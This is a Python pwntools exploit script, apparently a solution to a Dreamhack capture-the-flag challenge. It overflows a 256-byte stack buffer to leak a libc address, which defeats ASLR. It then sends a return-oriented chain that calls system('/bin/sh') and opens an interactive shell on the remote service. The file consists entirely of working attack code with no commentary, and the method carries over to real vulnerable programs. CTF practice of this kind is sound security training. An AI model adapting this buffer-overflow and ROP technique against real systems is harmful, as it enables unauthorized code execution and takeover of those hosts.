#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 18227)

    return r

def enter_and_recv(r, b):
    r.sendafter(b"Enter a string > ", b)
    r.recvuntil(b)
    return r.recvn(6)


def main():
    r = conn()

    r.sendafter(b"Enter a string > ", b"A" * 264)
    r.recvuntil(b"A" * 264)
    leak = r.recvn(6)
    
    __libc_start_call_main = u64(leak.ljust(8, b"\x00")) - 122
    libc.address = __libc_start_call_main - libc.symbols["__libc_start_call_main"]
    
    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]
    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    
    payload = b"A"*256
    payload += b"B"*8
    payload += p64(ret_gadget)
    payload += p64(rdi_gadget)
    payload += p64(binsh)
    payload += p64(system)

    r.sendafter(b"Enter a string > ", payload)
    r.sendafter(b"Enter a string > ", b"quit")

    r.interactive()


if __name__ == "__main__":
    main()
